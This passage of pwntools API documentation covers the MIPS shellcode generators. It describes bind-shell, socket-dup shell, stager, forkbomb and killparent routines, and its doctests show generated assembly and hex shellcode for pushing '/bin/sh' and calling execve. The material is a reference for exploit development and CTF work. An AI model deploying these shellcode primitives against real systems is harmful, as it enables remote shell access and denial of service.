<code class="descclassname">pwnlib.shellcraft.mips.</code><code class="descname">push</code><span class="sig-paren">(</span><em>value</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/push.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.push" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a value onto the stack.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.pushstr">
<code class="descclassname">pwnlib.shellcraft.mips.</code><code class="descname">pushstr</code><span class="sig-paren">(</span><em>string</em>, <em>append_null=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/pushstr.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.pushstr" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a string onto the stack without using
null bytes or newline characters.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;\x00&#39; */</span>
<span class="go">    sw $zero, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;a\x00&#39; */</span>
<span class="go">    li $t9, ~0x61</span>
<span class="go">    not $t1, $t9</span>
<span class="go">    sw $t1, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aa\x00&#39; */</span>
<span class="go">    ori $t1, $zero, 24929</span>
<span class="go">    sw $t1, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaa\x00&#39; */</span>
<span class="go">    li $t9, ~0x616161</span>
<span class="go">    not $t1, $t9</span>
<span class="go">    sw $t1, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaaa\x00&#39; */</span>
<span class="go">    li $t1, 0x61616161</span>
<span class="go">    sw $t1, -8($sp)</span>
<span class="go">    sw $zero, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -8</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaaaa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaaaa\x00&#39; */</span>
<span class="go">    li $t1, 0x61616161</span>
<span class="go">    sw $t1, -8($sp)</span>
<span class="go">    li $t9, ~0x61</span>
<span class="go">    not $t1, $t9</span>
<span class="go">    sw $t1, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -8</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="n">append_null</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaaa&#39; */</span>
<span class="go">    li $t1, 0x61616161</span>
<span class="go">    sw $t1, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xc3</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;\xc3\x00&#39; */</span>
<span class="go">    li $t9, ~0xc3</span>
<span class="go">    not $t1, $t9</span>
<span class="go">    sw $t1, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xc3</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">append_null</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;\xc3&#39; */</span>
<span class="go">    li $t9, ~0xc3</span>
<span class="go">    not $t1, $t9</span>
<span class="go">    sw $t1, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)))</span>
<span class="go">696e093c2f622935f8ffa9af97ff193cd08c393727482003fcffa9aff8ffbd27</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)))</span>
<span class="go">fcffa0affcffbd27</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)))</span>
<span class="go">fcffa0affcffbd27</span>
</pre></div>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>string</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The string to push.</li>
<li><strong>append_null</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to append a single NULL-byte before pushing.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.pushstr_array">
<code class="descclassname">pwnlib.shellcraft.mips.</code><code class="descname">pushstr_array</code><span class="sig-paren">(</span><em>reg</em>, <em>array</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/pushstr_array.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.pushstr_array" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes an array/envp-style array of pointers onto the stack.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Destination register to hold the pointer.</li>
<li><strong>array</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; Single argument or list of arguments to push.
NULL termination is normalized so that each argument
ends with exactly one NULL byte.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.setregs">
<code class="descclassname">pwnlib.shellcraft.mips.</code><code class="descname">setregs</code><span class="sig-paren">(</span><em>reg_context</em>, <em>stack_allowed=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/setregs.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.setregs" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets multiple registers, taking any register dependencies into account
(i.e., given eax=1,ebx=eax, set ebx first).</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg_context</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Desired register context</li>
<li><strong>stack_allowed</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Can the stack be used?</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;$t0&#39;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;$a3&#39;</span><span class="p">:</span><span class="s1">&#39;0&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    slti $a3, $zero, 0xFFFF /* $a3 = 0 */</span>
<span class="go">    li $t9, ~1</span>
<span class="go">    not $t0, $t9</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;$a0&#39;</span><span class="p">:</span><span class="s1">&#39;$a1&#39;</span><span class="p">,</span> <span class="s1">&#39;$a1&#39;</span><span class="p">:</span><span class="s1">&#39;$a0&#39;</span><span class="p">,</span> <span class="s1">&#39;$a2&#39;</span><span class="p">:</span><span class="s1">&#39;$a1&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    sw $a1, -4($sp) /* mov $a2, $a1 */</span>
<span class="go">    lw $a2, -4($sp)</span>
<span class="go">    xor $a1, $a1, $a0 /* xchg $a1, $a0 */</span>
<span class="go">    xor $a0, $a1, $a0</span>
<span class="go">    xor $a1, $a1, $a0</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.trap">
<code class="descclassname">pwnlib.shellcraft.mips.</code><code class="descname">trap</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/trap.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.trap" title="Permalink to this definition">¶</a></dt>
<dd><p>A trap instruction.</p>
</dd></dl>

</div>
<div class="section" id="module-pwnlib.shellcraft.mips.linux">
<span id="pwnlib-shellcraft-mips-linux"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.mips.linux" title="pwnlib.shellcraft.mips.linux"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.mips.linux</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.mips.linux" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing MIPS shellcodes for Linux.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.bindsh">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">bindsh</code><span class="sig-paren">(</span><em>port</em>, <em>network</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/bindsh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.bindsh" title="Permalink to this definition">¶</a></dt>
<dd><p>Listens on a TCP port and spawns a shell for the first to connect.
Port is the TCP port to listen on, network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.cat">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">cat</code><span class="sig-paren">(</span><em>filename</em>, <em>fd=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/cat.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.cat" title="Permalink to this definition">¶</a></dt>
<dd><p>Opens a file and writes its contents to the specified file descriptor.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">f</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mktemp</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s1">&#39;FLAG&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span>  <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">asm</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;FLAG&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.connect">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">connect</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network='ipv4'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/connect.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.connect" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects to the host on the specified port.
Network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.
Leaves the connected socket in $s0.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.dupsh">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">dupsh</code><span class="sig-paren">(</span><em>sock='$s0'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/dupsh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.dupsh" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [sock (imm/reg) = s0 ]
Duplicates sock to stdin, stdout and stderr and spawns a shell.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.echo">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">echo</code><span class="sig-paren">(</span><em>string</em>, <em>sock=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/echo.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.echo" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a string to a file descriptor</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.findpeer">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">findpeer</code><span class="sig-paren">(</span><em>port</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/findpeer.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.findpeer" title="Permalink to this definition">¶</a></dt>
<dd><p>Finds a connected socket. If port is specified it is checked
against the peer port. Resulting socket is left in $s0.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.findpeersh">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">findpeersh</code><span class="sig-paren">(</span><em>port</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/findpeersh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.findpeersh" title="Permalink to this definition">¶</a></dt>
<dd><p>Finds a connected socket. If port is specified it is checked
against the peer port. A dup2 shell is spawned on it.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.forkbomb">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">forkbomb</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/forkbomb.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.forkbomb" title="Permalink to this definition">¶</a></dt>
<dd><p>Performs a forkbomb attack.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.forkexit">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">forkexit</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/forkexit.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.forkexit" title="Permalink to this definition">¶</a></dt>
<dd><p>Attempts to fork.  If the fork is successful, the parent exits.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.killparent">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">killparent</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/killparent.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.killparent" title="Permalink to this definition">¶</a></dt>
<dd><p>Kills its parent process until whatever the parent is (probably init)
cannot be killed any longer.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.listen">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">listen</code><span class="sig-paren">(</span><em>port</em>, <em>network</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/listen.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.listen" title="Permalink to this definition">¶</a></dt>
<dd><p>Listens on a TCP port, accept a client and leave his socket in $s0.
Port is the TCP port to listen on, network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.readfile">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">readfile</code><span class="sig-paren">(</span><em>path</em>, <em>dst='$s0'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/readfile.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.readfile" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [path, dst (imm/reg) = $s0 ]
Opens the specified file path and sends its content to the specified file descriptor.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.sh">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">sh</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/sh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.sh" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute /bin/sh</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.stager">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">stager</code><span class="sig-paren">(</span><em>sock</em>, <em>size</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/stager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.stager" title="Permalink to this definition">¶</a></dt>
<dd><p>Read &#8216;size&#8217; bytes from &#8216;sock&#8217; and place them in an executable buffer and jump to it.
The socket will be left in $s0.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.mips.linux.syscall">
<code class="descclassname">pwnlib.shellcraft.mips.linux.</code><code class="descname">syscall</code><span class="sig-paren">(</span><em>syscall=None</em>, <em>arg0=None</em>, <em>arg1=None</em>, <em>arg2=None</em>, <em>arg3=None</em>, <em>arg4=None</em>, <em>arg5=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/mips/linux/syscall.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.mips.linux.syscall" title="Permalink to this definition">¶</a></dt>
<dd><dl class="docutils">
<dt>Args: [syscall_number, *args]</dt>
<dd>Does a syscall</dd>
</dl>
<p>Any of the arguments can be expressions to be evaluated by <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;$sp&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call execve(1, &#39;$sp&#39;, 2, 0) */</span>
<span class="go">    li $t9, ~1</span>
<span class="go">    not $a0, $t9</span>
<span class="go">    add $a1, $sp, $0 /* mov $a1, $sp */</span>
<span class="go">    li $t9, ~2</span>
<span class="go">    not $a2, $t9</span>
<span class="go">    slti $a3, $zero, 0xFFFF /* $a3 = 0 */</span>
<span class="go">    ori $v0, $zero, SYS_execve</span>
<span class="go">    syscall 0x40404</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call execve(2, 1, 0, 0x14) */</span>
<span class="go">    li $t9, ~2</span>
<span class="go">    not $a0, $t9</span>
<span class="go">    li $t9, ~1</span>
<span class="go">    not $a1, $t9</span>
<span class="go">    slti $a2, $zero, 0xFFFF /* $a2 = 0 */</span>
<span class="go">    li $t9, ~0x14</span>
<span class="go">    not $a3, $t9</span>
<span class="go">    ori $v0, $zero, SYS_execve</span>
<span class="go">    syscall 0x40404</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall() */</span>
<span class="go">    syscall 0x40404</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;$v0&#39;</span><span class="p">,</span> <span class="s1">&#39;$a0&#39;</span><span class="p">,</span> <span class="s1">&#39;$a1&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall(&#39;$v0&#39;, &#39;$a0&#39;, &#39;$a1&#39;) */</span>
<span class="go">    /* setregs noop */</span>
<span class="go">    syscall 0x40404</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;$a3&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall(&#39;$a3&#39;, ?, ?, 1) */</span>
<span class="go">    li $t9, ~1</span>
<span class="go">    not $a2, $t9</span>
<span class="go">    sw $a3, -4($sp) /* mov $v0, $a3 */</span>
<span class="go">    lw $v0, -4($sp)</span>
<span class="go">    syscall 0x40404</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">mips</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span>
<span class="gp">... </span>              <span class="s1">&#39;SYS_mmap2&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
<span class="gp">... </span>              <span class="s1">&#39;PROT_READ | PROT_WRITE | PROT_EXEC&#39;</span><span class="p">,</span>
<span class="gp">... </span>              <span class="s1">&#39;MAP_PRIVATE | MAP_ANONYMOUS&#39;</span><span class="p">,</span>
<span class="gp">... </span>              <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call mmap2(0, 0x1000, &#39;PROT_READ | PROT_WRITE | PROT_EXEC&#39;, &#39;MAP_PRIVATE | MAP_ANONYMOUS&#39;, -1, 0) */</span>
<span class="go">    slti $a0, $zero, 0xFFFF /* $a0 = 0 */</span>
<span class="go">    li $t9, ~0x1000</span>
<span class="go">    not $a1, $t9</span>
<span class="go">    li $t9, ~(PROT_READ | PROT_WRITE | PROT_EXEC) /* 7 */</span>
<span class="go">    not $a2, $t9</span>
<span class="go">    ori $a3, $zero, (MAP_PRIVATE | MAP_ANONYMOUS)</span>
<span class="go">    ori $v0, $zero, SYS_mmap2</span>
<span class="go">    syscall 0x40404</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/home/pwn/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* open(file=&#39;/home/pwn/flag&#39;, oflag=0, mode=0) */</span>
